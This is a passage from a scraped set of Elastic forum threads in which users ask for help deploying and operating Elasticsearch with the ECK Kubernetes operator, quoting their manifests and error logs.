    "body": "Hi, I'm trying the GA version, but my cluster doesn't start and I don't understand what I'm missing. Previously I started cluster with the beta version. I share with you my elasticsearch manifests, events I found about elasticsearch and the error log of the operator: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: creationTimestamp: \"2020-02-21T15:45:18Z\" generation: 1 name: datawarehouse namespace: default resourceVersion: \"55656287\" selfLink: /apis/elasticsearch.k8s.elastic.co/v1/namespaces/default/elasticsearches/datawarehouse uid: 2967e3de-54c1-11ea-ae73-4201c0a8000a spec: http: tls: selfSignedCertificate: disabled: true image: gcr.io/hivebrite/elasticsearch7:7cabc9a nodeSets: - config: node.data: false node.master: true count: 3 name: master podTemplate: spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: workloadType operator: In values: - elasticsearch podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - podAffinityTerm: labelSelector: matchLabels: elasticsearch.k8s.elastic.co/cluster-name: datawarehouse topologyKey: failure-domain.beta.kubernetes.io/zone requiredDuringSchedulingIgnoredDuringExecution: - podAffinityTerm: labelSelector: matchLabels: elasticsearch.k8s.elastic.co/cluster-name: datawarehouse topologyKey: kubernetes.io/hostname containers: - env: - name: ES_JAVA_OPTS value: -Xms4096m -Xmx4096m limits: cpu: 4000m memory: 8Gi name: elasticsearch resources: requests: cpu: 4000m memory: 8Gi securityContext: allowPrivilegeEscalation: false capabilities: drop: - SETPCAP - MKNOD - AUDIT_WRITE - CHOWN - NET_RAW - DAC_OVERRIDE - FOWNER - FSETID - KILL - SETGID - SETUID - NET_BIND_SERVICE - SYS_CHROOT - SETFCAP runAsUser: 1000 initContainers: - command: - sh - -c - sysctl -w vm.max_map_count=262144 name: sysctl securityContext: privileged: true metadata: labels: clusterName: wip region: europe-west1 volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi storageClassName: standard - config: node.data: true node.master: false count: 3 name: data podTemplate: spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: workloadType operator: In values: - elasticsearch podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - podAffinityTerm: labelSelector: matchLabels: elasticsearch.k8s.elastic.co/cluster-name: datawarehouse topologyKey: failure-domain.beta.kubernetes.io/zone requiredDuringSchedulingIgnoredDuringExecution: - podAffinityTerm: labelSelector: matchLabels: elasticsearch.k8s.elastic.co/cluster-name: datawarehouse topologyKey: kubernetes.io/hostname containers: - env: - name: ES_JAVA_OPTS value: -Xms4096m -Xmx4096m limits: cpu: 4000m memory: 8Gi name: elasticsearch resources: requests: cpu: 4000m memory: 8Gi securityContext: allowPrivilegeEscalation: false capabilities: drop: - SETPCAP - MKNOD - AUDIT_WRITE - CHOWN - NET_RAW - DAC_OVERRIDE - FOWNER - FSETID - KILL - SETGID - SETUID - NET_BIND_SERVICE - SYS_CHROOT - SETFCAP runAsUser: 1000 initContainers: - command: - sh - -c - sysctl -w vm.max_map_count=262144 name: sysctl securityContext: privileged: true metadata: labels: clusterName: wip region: europe-west1 volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi storageClassName: standard secureSettings: - secretName: datawarehouse-aws-credentials updateStrategy: changeBudget: maxSurge: 1 maxUnavailable: 1 version: 7.6.0 events: Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning CompatibilityCheckError 11m (x18 over 30m) elasticsearch-controller Error during compatibility check: Timeout: request did not complete within requested timeout 30s operator error log: { \"level\":\"error\", \"@timestamp\":\"2020-02-21T15:48:59.347Z\", \"logger\":\"controller-runtime.controller\", \"message\":\"Reconciler error\", \"ver\":\"1.0.1-bcb74688\", \"controller\":\"elasticsearch-controller\", \"request\":\"default/datawarehouse\", \"error\":\"Timeout: request did not complete within requested timeout 30s\", \"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).reconcileHandler\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:258\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).processNextWorkItem\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:232\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).worker\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:211\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil.func1\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:152\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:153\\nk8s.io/apimachinery/pkg/util/wait.Until\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:88\" }",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "f554425c-7fb8-4bda-8ca4-7f7212b9d189",
    "url": "https://discuss.elastic.co/t/eck-sizing/220887",
    "title": "ECK Sizing",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Nevetha_K",
    "date": "February 25, 2020, 4:03pm February 25, 2020, 4:54pm",
    "body": "Hi - We are considering moving to ECK to be run on Openshift Platform. Currently the elasticsearch is running on a VM with (5 Node cluster with 8x32 VM size). Once I move to OCP, how will the node sizing work? Is it going to be a 1:1 sizing for VM:Kubernetes Worker Node? For eg, will I need 5 Worker Nodes with 8x32 and each worker node running one container?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "036fc8c8-b9ab-461f-b8a0-432c366a647d",
    "url": "https://discuss.elastic.co/t/log4j-configuration/220565",
    "title": "Log4j Configuration",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dtapia",
    "date": "February 23, 2020, 6:07pm February 24, 2020, 8:16am February 24, 2020, 2:52pm",
    "body": "I need to edit the log4j configuration in log4j.properties, the file is editible if I exec into it but the changes dont persist accross pod restarts. Is there a way to configure this through the operator or a yaml file?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "958a4f07-d7d3-4d33-8165-7f3fda8ec9dd",
    "url": "https://discuss.elastic.co/t/license-error/220650",
    "title": "License error",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Francismara_Souza",
    "date": "February 24, 2020, 12:52pm February 24, 2020, 1:08pm February 24, 2020, 1:11pm February 24, 2020, 1:13pm February 24, 2020, 1:13pm February 24, 2020, 1:19pm",
    "body": "Hi guys, I'm receiving this error on my ECK: Could not update cluster license: failed to revert to basic: 503 Service Unavailable: I installed it using the basic confirmations on the Quick start page. When I try to get the license from kibana it works and the license is valid. Any guess?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "fef9a580-8132-4084-83e6-42046b54b5b1",
    "url": "https://discuss.elastic.co/t/does-eck-offer-log-collection-directly-from-files-in-kubernetes/220574",
    "title": "Does ECK offer log collection directly from files in kubernetes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "kumar_kung",
    "date": "February 24, 2020, 6:13am February 24, 2020, 8:23am",
    "body": "Does ECK 1.0.0 GA offer log collection directly from files in kubernetes ? Or pls guide me to it",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2b8f20d6-8af5-4b6c-b60d-afbd79d43b54",
    "url": "https://discuss.elastic.co/t/reconciler-error-when-trying-to-deploy-an-elasticsearch/218628",
    "title": "Reconciler error when trying to deploy an elasticsearch",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "FlorianT",
    "date": "February 10, 2020, 3:57pm February 10, 2020, 6:35pm February 11, 2020, 7:59am February 18, 2020, 1:46pm February 18, 2020, 3:24pm February 19, 2020, 10:11am February 19, 2020, 1:41pm",
    "body": "Hello, I've got an issue with the the ECK operator on Openshift when I'm trying to deploy an elasticsearch, when I deploy the elasticsearch object, I've got the following errors on the operator logs: {\"level\":\"info\",\"@timestamp\":\"2020-02-10T15:23:21.824Z\",\"logger\":\"elasticsearch-controller\",\"message\":\"Ending reconciliation run\",\"ver\":\"1.0.0-6881438d\",\"iteration\":16,\"namespace\":\"mosaic-elk\",\"name\":\"elasticsearch-sample\",\"took\":0.843814306} {\"level\":\"error\",\"@timestamp\":\"2020-02-10T15:23:21.824Z\",\"logger\":\"controller-runtime.controller\",\"message\":\"Reconciler error\",\"ver\":\"1.0.0-6881438d\",\"controller\":\"elasticsearch-controller\",\"request\":\"mosaic-elk/elasticsearch-sample\",\"error\":\"the server could not find the requested resource (put elasticsearches.elasticsearch.k8s.elastic.co elasticsearch-sample)\",\"errorCauses\":[{\"error\":\"the server could not find the requested resource (put elasticsearches.elasticsearch.k8s.elastic.co elasticsearch-sample)\"}],\"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).reconcileHandler\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:258\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).processNextWorkItem\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:232\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).worker\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:211\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil.func1\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:152\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:153\\nk8s.io/apimachinery/pkg/util/wait.Until\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:88\"} {\"level\":\"debug\",\"@timestamp\":\"2020-02-10T15:23:21.824Z\",\"logger\":\"controller-runtime.manager.events\",\"message\":\"Warning\",\"ver\":\"1.0.0-6881438d\",\"object\":{\"kind\":\"Elasticsearch\",\"namespace\":\"mosaic-elk\",\"name\":\"elasticsearch-sample\",\"uid\":\"20adeb99-4c19-11ea-a947-fa163e7e2bbc\",\"apiVersion\":\"elasticsearch.k8s.elastic.co/v1\",\"resourceVersion\":\"7997994\"},\"reason\":\"ReconciliationError\",\"message\":\"Reconciliation error: the server could not find the requested resource (put elasticsearches.elasticsearch.k8s.elastic.co elasticsearch-sample)\"} Despite having this error, an elasticsearch pod start: $ oc get pods NAME READY STATUS RESTARTS AGE elastic-operator-0 1/1 Running 0 33m elasticsearch-sample-es-default-0 1/1 Running 0 32m $ oc get elasticsearch NAME AGE elasticsearch-sample 32m I haven't been able to find any issue on github or subject on this forum discussing this error. Here's the file I'm using for deploying elasticsearch: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: elasticsearch-sample spec: baseImage: registry/elasticsearch tag: v7.5.1 version: 7.5.1 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.store.allow_mmap: false podTemplate: metadata: labels: foo: bar spec: containers: - name: elasticsearch image: registry/elasticsearch:v7.5.1 resources: requests: memory: 1Gi cpu: 1 limits: memory: 2Gi cpu: 1 volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi storageClassName: storage Anyone ever encountered this issue ? Thanks.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "e3d1144d-14d8-4710-9674-4cfaabf411a6",
    "url": "https://discuss.elastic.co/t/resize-disk-of-a-stateful-set/219758",
    "title": "Resize disk of a stateful set",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dg_hivebrite",
    "date": "February 18, 2020, 10:37am February 18, 2020, 10:49am February 18, 2020, 1:04pm February 18, 2020, 1:39pm February 18, 2020, 3:59pm",
    "body": "Hi, I have a cluster and I want to resize disks in my cluster. The storage class is \"ssd\" a custom storage class name with the following definition: allowVolumeExpansion: true apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: creationTimestamp: \"2019-12-17T09:16:59Z\" name: ssd resourceVersion: \"17946775\" selfLink: /apis/storage.k8s.io/v1/storageclasses/ssd uid: fa981893-20ad-11ea-bc1e-4201c0a80008 parameters: type: pd-ssd provisioner: kubernetes.io/gce-pd reclaimPolicy: Delete volumeBindingMode: Immediate So with this storage class I enabled the resize of my volume. When I try to resize the volume the operator doesn't resize the disk { \"level\":\"error\", \"@timestamp\":\"2020-02-18T10:27:53.573Z\", \"logger\":\"controller-runtime.controller\", \"message\":\"Reconciler error\", \"ver\":\"1.0.0-beta1-84792e30\", \"controller\":\"elasticsearch-controller\", \"request\":\"default/elk-jaeger-datastore\", \"error\":\"StatefulSet.apps \\\"elk-jaeger-datastore-es-all-europe-west1-a\\\" is invalid: spec: Forbidden: updates to statefulset spec for fields other than 'replicas', 'template', and 'updateStrategy' are forbidden\", \"errorCauses\":[ { \"error\":\"StatefulSet.apps \\\"elk-jaeger-datastore-es-all-europe-west1-a\\\" is invalid: spec: Forbidden: updates to statefulset spec for fields other than 'replicas', 'template', and 'updateStrategy' are forbidden\" } ], \"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).reconcileHandler\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.2.1/pkg/internal/controller/controller.go:218\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).processNextWorkItem\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.2.1/pkg/internal/controller/controller.go:192\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).worker\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.2.1/pkg/internal/controller/controller.go:171\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil.func1\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20190404173353-6a84e37a896d/pkg/util/wait/wait.go:152\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20190404173353-6a84e37a896d/pkg/util/wait/wait.go:153\\nk8s.io/apimachinery/pkg/util/wait.Until\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20190404173353-6a84e37a896d/pkg/util/wait/wait.go:88\" } So I would like to know if there is a way to resize the disk or a feature in progress ? If not how can I resize my cluster without dropping my cluster ? ( Adding new pods with the new size then waiting the data migration and delete step by step old pods ?)",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "83affd4f-7c8b-498f-b737-9bd1dd8b7d86",
    "url": "https://discuss.elastic.co/t/operator-upgrade-causes-nodes-to-be-restarted/219640",
    "title": "Operator Upgrade causes nodes to be restarted",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "acondrat",
    "date": "February 17, 2020, 2:30pm February 17, 2020, 2:49pm February 17, 2020, 6:16pm",
    "body": "Hello, I noticed that upgrading the operator causes all the nodes in the cluster to be restarted. Perhaps it is because it changes the common.k8s.elastic.co/controller-version annotation on the Elasticsearch object. This might be a source of trouble (downtime, performance degradation, etc). Is this some expected behavior and can it be avoided? Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "513ec135-861e-4c9f-88b3-454de3ea56fd",
    "url": "https://discuss.elastic.co/t/elastic-operator-requests-regularly-time-out/219096",
    "title": "Elastic-operator requests regularly time out",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "simonjam",
    "date": "February 13, 2020, 12:06am February 13, 2020, 7:45am February 13, 2020, 5:19pm February 13, 2020, 6:57pm February 14, 2020, 1:15am February 14, 2020, 5:26pm February 15, 2020, 1:05am",
    "body": "Hi, I'm using ECK on GKE. Almost every time I make any modifications (initial apply, edit) to the elasticsearch object, it times out. But only barely! If I increase the timeout, the command usually succeeds in 30.1s. For example, here's the output of kubectl edit es elasticsearch-eck --request-timeout=60s: I0212 15:26:57.363492 68694 round_trippers.go:438] PUT https://<master>/apis/elasticsearch.k8s.elastic.co/v1/namespaces/default/elasticsearches/elasticsearch-eck?timeout=1m0s 200 OK in 30093 milliseconds This isn't so bad locally, because I can easily bump the timeout to kubectl. However, it seems to also affect the elastic-operator, which also experiences the timeouts. For example, here I'm trying to reduce the number of nodes. But the operator is stuck failing to update the annotation for minimum_master_nodes. ... E 2020-02-12T18:45:51.190380453Z Updating minimum master nodes I 2020-02-12T18:45:51.203436Z Request Body: <trimmed> I 2020-02-12T18:45:51.203671Z curl -k -v -XPUT -H \"Accept: application/json, */*\" -H \"Content-Type: application/json\" -H \"User-Agent: elastic-operator/v0.0.0 (linux/amd64) kubernetes/$Format\" -H \"Authorization: Bearer <trimmed>\" 'https://10.0.16.1:443/apis/elasticsearch.k8s.elastic.co/v1/namespaces/default/elasticsearches/elasticsearch-eck' E 2020-02-12T18:45:51.505008214Z Retrieving cluster state E 2020-02-12T18:46:01.504865401Z Retrieving cluster state E 2020-02-12T18:46:11.505025417Z Retrieving cluster state I 2020-02-12T18:46:21.206976Z PUT https://10.0.16.1:443/apis/elasticsearch.k8s.elastic.co/v1/namespaces/default/elasticsearches/elasticsearch-eck 504 Gateway Timeout in 30003 milliseconds I 2020-02-12T18:46:21.207016Z Response Headers: I 2020-02-12T18:46:21.207022Z Audit-Id: a9ab3f93-c36c-4c28-a224-f97a03001822 I 2020-02-12T18:46:21.207027Z Content-Type: application/json I 2020-02-12T18:46:21.207030Z Content-Length: 187 I 2020-02-12T18:46:21.207034Z Date: Wed, 12 Feb 2020 18:46:21 GMT I 2020-02-12T18:46:21.207082Z Response Body: {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"Timeout: request did not complete within requested timeout 30s\",\"reason\":\"Timeout\",\"details\":{},\"code\":504} E 2020-02-12T18:46:21.207784068Z Ending reconciliation run E 2020-02-12T18:46:21.207793754Z Reconciler error ... This repeats for many hours and only occasionally, magically, gets through and makes progress. Is there a way to bump this timeout? Or is there something else to look into regarding why these operations seem to take exactly the wrong amount of time? I don't think there's anything terribly fancy in the config: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: elasticsearch-eck spec: version: 6.8.6 nodeSets: - name: default count: 3 config: node.master: true node.data: true node.ingest: true processors: 8 reindex.remote.whitelist: \"*:9200\" thread_pool.index.queue_size: 500 thread_pool.write.queue_size: 500 xpack.security.authc: anonymous: username: anonymous roles: superuser authz_exception: false podTemplate: spec: containers: - name: elasticsearch resources: requests: memory: 44Gi limits: memory: 44Gi env: - name: ES_JAVA_OPTS value: -Xmx12g -Xms12g -XX:-UseParallelGC -XX:-UseConcMarkSweepGC -XX:+UseG1GC initContainers: - name: sysctl securityContext: privileged: true command: ['sh', '-c', 'sysctl -w vm.max_map_count=262144'] volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 100Gi storageClassName: standard http: service: metadata: annotations: cloud.google.com/load-balancer-type: Internal spec: type: LoadBalancer tls: selfSignedCertificate: disabled: true Thanks, James",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "8b589e79-4581-41e3-a9ab-50b8b206a636",
    "url": "https://discuss.elastic.co/t/error-from-server-internalerror-error-when-creating-stdin-internal-error-occurred-resource-quota-evaluates-timeout/216539",
    "title": "Error from server (InternalError): error when creating \"STDIN\": Internal error occurred: resource quota evaluates timeout",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "alexus",
    "date": "January 25, 2020, 7:08pm February 10, 2020, 8:10am February 13, 2020, 5:55am February 13, 2020, 7:23am February 14, 2020, 5:36am",
    "body": "Hello World! I'm trying to follow Quickstart | Elastic Cloud on Kubernetes [1.0] | Elastic, yet running into following error: $ cat <<EOF | kubectl apply -f - > apiVersion: elasticsearch.k8s.elastic.co/v1 > kind: Elasticsearch > metadata: > name: quickstart > spec: > version: 7.5.2 > nodeSets: > - name: default > count: 1 > config: > node.master: true > node.data: true > node.ingest: true > node.store.allow_mmap: false > EOF Error from server (InternalError): error when creating \"STDIN\": Internal error occurred: resource quota evaluates timeout $ $ kubectl version Client Version: version.Info{Major:\"1\", Minor:\"17\", GitVersion:\"v1.17.0\", GitCommit:\"70132b0f130acc0bed193d9ba59dd186f0e634cf\", GitTreeState:\"clean\", BuildDate:\"2019-12-07T21:20:10Z\", GoVersion:\"go1.13.4\", Compiler:\"gc\", Platform:\"linux/amd64\"} Server Version: version.Info{Major:\"1\", Minor:\"17\", GitVersion:\"v1.17.0\", GitCommit:\"70132b0f130acc0bed193d9ba59dd186f0e634cf\", GitTreeState:\"clean\", BuildDate:\"2019-12-07T21:12:17Z\", GoVersion:\"go1.13.4\", Compiler:\"gc\", Platform:\"linux/amd64\"} $ Please advise) Thanks in advance!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "327099af-9329-4afd-b64e-e7d6fd877042",
    "url": "https://discuss.elastic.co/t/dont-want-to-use-https-and-user-password/202332",
    "title": "Don't want to use https and user:password",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Kumar_Saurabh_Srivas",
    "date": "October 4, 2019, 11:15am October 4, 2019, 12:47pm October 4, 2019, 1:35pm October 4, 2019, 5:55pm October 16, 2019, 4:30pm January 16, 2020, 5:16pm February 13, 2020, 10:41am",
    "body": "Hi I am deploying ECK on GKE in a private Kubernetes cluster. That cluster has the only service which will talk to Elasticsearch. So I don't need to have any https or user:password authentication. All I want is a simple clusterIP service which can be directly accessed by the service within the kubernetes cluster. Please let me know how to do that.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d0790409-617a-472e-847c-80b49aba5706",
    "url": "https://discuss.elastic.co/t/elastic-operator-on-private-google-kubernetes-engine-cluster/219032",
    "title": "Elastic Operator on Private Google Kubernetes Engine Cluster",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Q_Platform",
    "date": "February 12, 2020, 3:33pm February 12, 2020, 5:08pm",
    "body": "Can someone walkthrough on using Elastic Operator on Private Google Kubernetes Engine? The pods were not getting created",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "49907aef-e6f0-4eba-a8e5-3eef8cd1745c",
    "url": "https://discuss.elastic.co/t/the-customresourcedefinition-elasticsearches-elasticsearch-k8s-elastic-co-is-invalid/218557",
    "title": "The CustomResourceDefinition \"elasticsearches.elasticsearch.k8s.elastic.co\" is invalid",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Abhilash_B",
    "date": "February 10, 2020, 10:09am February 10, 2020, 10:33am February 10, 2020, 11:23am February 12, 2020, 2:52pm",
    "body": "I apply this command on my kubernetes cluster kubectl delete -f https://download.elastic.co/downloads/eck/0.9.0/all-in-one.yaml I get this error: The CustomResourceDefinition \"elasticsearches.elasticsearch.k8s.elastic.co\" is invalid: * status.storedVersions[0]: Invalid value: \"v1beta1\": must appear in spec.versions * status.storedVersions[1]: Invalid value: \"v1\": must appear in spec.versions Any help is highly appreciated.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "924dee03-9d0d-4903-9d9f-9573f5f9f223",
    "url": "https://discuss.elastic.co/t/kubectl-apply-failed-installing-es/218652",
    "title": "Kubectl apply failed installing ES",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "opouwels",
    "date": "February 10, 2020, 6:12pm February 10, 2020, 6:44pm February 10, 2020, 7:15pm February 10, 2020, 7:40pm February 11, 2020, 9:15am",
    "body": "I keep getting the following error, while my collegues with \"almost\" exactly the same configuration in minikube have no issues: TASK [elastic : Elastic Cluster] ******************************************************************************************************************************************************************** fatal: [minikube]: FAILED! => { \"changed\": false } MSG: Failed to find exact match for elasticsearch.k8s.elastic.co/v1beta1.Elasticsearch by [kind, name, singularName, shortNames] cat elastic_cluster.yml apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: elastic namespace: \"{{ config.elastic.namespace }}\" spec: version: \"{{ config.elastic.version }}\" nodeSets: name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false xpack.security.authc.realms.native.native1.order: 0 with elastic: namespace: l12m-elastic fqdn: elastic.local.l12m.nl version: 7.4.2",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ec81d83d-84ad-4fe7-ac4c-393030dbc56e",
    "url": "https://discuss.elastic.co/t/upgrade-storage-space-for-elasticsearch/218630",
    "title": "Upgrade storage space for elasticsearch",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "atotheb",
    "date": "February 10, 2020, 4:05pm February 10, 2020, 4:48pm February 10, 2020, 4:33pm February 10, 2020, 4:43pm February 11, 2020, 8:11am",
    "body": "I try to increase the capacity of my persistant volume for elasticsearch. However this seems to be not so straightforward, as explained in this article: https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-orchestration.html#k8s-orchestration-limitations I'm new to Kubernetes, and I struggle to make sense of this article. The article suggest to rename NodeSet, but I can't find any resources of type NodeSet in my cluster. And how can renaming a nodeset create a new StatfulSet with increased storage capacity? Many thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d3651fe6-5ac7-4f43-afc1-e89d0379555b",
    "url": "https://discuss.elastic.co/t/cert-validity-isnt-working/218631",
    "title": "Cert-validity isn't working",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "deepak_deore",
    "date": "February 10, 2020, 4:10pm February 10, 2020, 7:34pm",
    "body": "I asked this question on slack but no reply yet so asking here: is there anything wrong with these ssl options, it doesn’t seem to be working, it always show 1 year certificate while accessing 9200 port this is the operator’s ps output, i re-created elasticsearch quickstart but cert is still 1 year, anything I am doing wrong? ./elastic-operator manager --operator-roles all --log-verbosity=1 --cert-validity=15m --cert-rotate-before=5m",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "839c9c48-eae8-40e2-8540-536af1eb6887",
    "url": "https://discuss.elastic.co/t/air-gap-systems-running-with-private-docker-registry/186392",
    "title": "Air-Gap-Systems: Running with private docker registry?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "asp",
    "date": "June 19, 2019, 7:10am June 20, 2019, 2:39pm February 6, 2020, 6:04pm February 7, 2020, 9:30am February 7, 2020, 12:48pm February 7, 2020, 1:20pm February 7, 2020, 1:45pm February 10, 2020, 2:51pm",
    "body": "Hi, can I configure ECK to use a private docker registry? Target infrastructure will be a bare-metal kubernetes cluster which is air-gap, so the elastic registry will not be available for me. Thanks, Andreas",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "029dc9d1-d594-4f4f-b146-d98f82fea5b3",
    "url": "https://discuss.elastic.co/t/eck-with-storage-class/218424",
    "title": "ECK with Storage Class",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Nerbelir",
    "date": "February 8, 2020, 1:24am February 8, 2020, 4:23am",
    "body": "Hola, I'm trying to something a bit novel and use the guides for quickstart and volume templates to get ECK working. The novel part is I'm mounting an SMB share with Azure's Flexvolume SMB driver. I can get the PV setup and a test PVC works just fine, however I'm running into issues getting the quickstart to see the PV to use. I'm hoping I'm just doing something wrong in one of my templates and could be corrected. I've included the relevant PV, Storage Class, and Quickstart yaml files i'm using below. Any help would be greatly appreciated. Error on PVC created from the yaml: waiting for a volume to be created, either by external provisioner PV.yaml apiVersion: v1 kind: PersistentVolume metadata: name: k8s-sofs-pv spec: capacity: storage: 50Gi accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain storageClassName: flexvolume-smb-k8s-sofs flexVolume: driver: \"microsoft.com/smb\" secretRef: name: smbcreds options: source: \"//k8s-sofs.lab.nerbelir.com/k8s-pv-elk\" mountoptions: \"vers=3.0,dir_mode=0777,file_mode=0777\" StorageClass.yaml kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: flexvolume-smb-k8s-sofs provisioner: k8s-sofs.lab.nerbelir.com/k8s-pv-elk mountOptions: vers=3.0 dir_mode=0777 file_mode=0777 reclaimPolicy: Retain allowVolumeExpansion: true elastic-quickstart.yaml apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: quickstart spec: version: 7.5.2 nodeSets: name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false volumeClaimTemplates: metadata: name: elasticsearch-data spec: accessModes: ReadWriteOnce resources: requests: storage: 5Gi storageClassName: flexvolume-smb-k8s-sofs",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "291571c1-383d-48c1-8783-9ad30e287b62",
    "url": "https://discuss.elastic.co/t/qucikstart-fail-to-get-api-group-resources-and-unable-to-crate-controller-manager/218198",
    "title": "Qucikstart - fail to get API group resources and unable to crate controller manager",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Autumn",
